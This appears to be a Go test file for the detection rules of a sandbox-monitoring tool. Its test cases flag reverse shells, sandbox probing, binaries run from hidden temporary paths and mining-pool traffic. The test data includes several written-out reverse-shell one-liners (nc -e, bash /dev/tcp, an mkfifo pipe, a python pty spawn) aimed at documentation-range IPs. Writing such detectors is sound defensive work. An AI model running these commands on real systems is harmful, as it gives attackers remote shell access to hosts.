package report

import (
	"strings"
	"testing"
	"time"

	"github.com/Frostykiller3m/Quaarant/internal/events"
)

func ev(t *testing.T, src events.Source, p events.Payload) events.Event {
	t.Helper()
	e, err := events.New("sb", src, time.Now(), p)
	if err != nil {
		t.Fatal(err)
	}
	return e
}

func execEv(t *testing.T, path string, argv ...string) events.Event {
	return ev(t, events.SourceHost, events.Exec{PID: 10, PPID: 1, Path: path, Argv: argv})
}

func titles(fs []Finding) string {
	var out []string
	for _, f := range fs {
		out = append(out, f.Title)
	}
	return strings.Join(out, "; ")
}

func TestRules(t *testing.T) {
	yes := true
	tests := []struct {
		name string
		evs  func(t *testing.T) []events.Event
		want string // a finding title, or "" for none
	}{
		{"nc -e", func(t *testing.T) []events.Event {
			return []events.Event{execEv(t, "/bin/busybox", "nc", "203.0.113.9", "4444", "-e", "/bin/sh")}
		}, "Reverse shell attempt"},
		{"bash /dev/tcp", func(t *testing.T) []events.Event {
			return []events.Event{execEv(t, "/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/198.51.100.7/9001 0>&1")}
		}, "Reverse shell attempt"},
		{"mkfifo shell", func(t *testing.T) []events.Event {
			return []events.Event{execEv(t, "/bin/sh", "sh", "-c", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f")}
		}, "Reverse shell attempt"},
		{"python pty", func(t *testing.T) []events.Event {
			return []events.Event{execEv(t, "/usr/bin/python3", "python3", "-c", "import socket,pty;s=socket.socket();s.connect(('x',1));pty.spawn('sh')")}
		}, "Reverse shell attempt"},
		{"plain nc is not a shell", func(t *testing.T) []events.Event {
			return []events.Event{execEv(t, "/bin/busybox", "nc", "-z", "example.com", "443")}
		}, ""},
		{"sandbox probing", func(t *testing.T) []events.Event {
			return []events.Event{
				ev(t, events.SourceHost, events.File{Op: "open", Path: "/.dockerenv", Errno: "ENOENT"}),
				ev(t, events.SourceHost, events.File{Op: "open", Path: "/sys/class/dmi/id/product_name"}),
			}
		}, "Looked for signs of a sandbox"},
		{"dmesg alone", func(t *testing.T) []events.Event {
			return []events.Event{execEv(t, "/bin/busybox", "dmesg")}
		}, "Looked for signs of a sandbox"},
		{"one artifact and cpuinfo are normal", func(t *testing.T) []events.Event {
			return []events.Event{
				ev(t, events.SourceHost, events.File{Op: "open", Path: "/.dockerenv", Errno: "ENOENT"}),
				ev(t, events.SourceHost, events.File{Op: "open", Path: "/proc/cpuinfo"}),
				ev(t, events.SourceHost, events.File{Op: "open", Path: "/proc/self/cgroup"}),
			}
		}, ""},
		{"hidden /tmp binary", func(t *testing.T) []events.Event {
			return []events.Event{execEv(t, "/tmp/.x11-unix-cache/upd", "upd")}
		}, "Ran a program from a hidden or temporary location"},
		{"go test binaries and npm bins are normal", func(t *testing.T) []events.Event {
			return []events.Event{
				execEv(t, "/tmp/go-build123/b001/rev.test", "rev.test"),
				execEv(t, "/tmp/repo/node_modules/.bin/jest", "jest"),
				execEv(t, "/tmp/.local/bin/pytest", "pytest"),
				execEv(t, "/tmp/repo/build.sh", "./build.sh"),
			}
		}, ""},
		{"pool operator lookup", func(t *testing.T) []events.Event {
			return []events.Event{ev(t, events.SourceHost, events.DNS{QName: "xmr-eu1.nanopool.org", QType: "A", Allowed: true})}
		}, "Mining pool traffic"},
		{"pool.ntp.org is not a mining pool", func(t *testing.T) []events.Event {
			return []events.Event{ev(t, events.SourceHost, events.DNS{QName: "pool.ntp.org", QType: "A", Allowed: true})}
		}, ""},
		{"a refused connection to 4444 is not mining", func(t *testing.T) []events.Event {
			no := false
			return []events.Event{ev(t, events.SourceHost, events.Net{Op: "connect", Proto: "tcp", DstIP: "203.0.113.9", DstPort: 4444, Allowed: &no})}
		}, ""},
		{"an allowed connection to 3333", func(t *testing.T) []events.Event {
			return []events.Event{ev(t, events.SourceHost, events.Net{Op: "connect", Proto: "tcp", DstIP: "141.94.96.195", DstPort: 3333, Allowed: &yes})}
		}, "Mining pool traffic"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			evs := tt.evs(t)
			fs := Rules(evs)
			got := titles(fs)
			if (tt.want == "") != (got == "") || !strings.Contains(got, tt.want) {
				t.Errorf("findings %q, want %q", got, tt.want)
			}
			// Rule findings always survive validation (they cite real events of fitting kinds).
			byID := map[string]events.Event{}
			for _, e := range evs {
				byID[e.ID] = e
			}
			if _, dropped := Validate(fs, byID); len(dropped) != 0 {
				t.Errorf("a rule finding fails validation: %+v", dropped)
			}
		})
	}
}
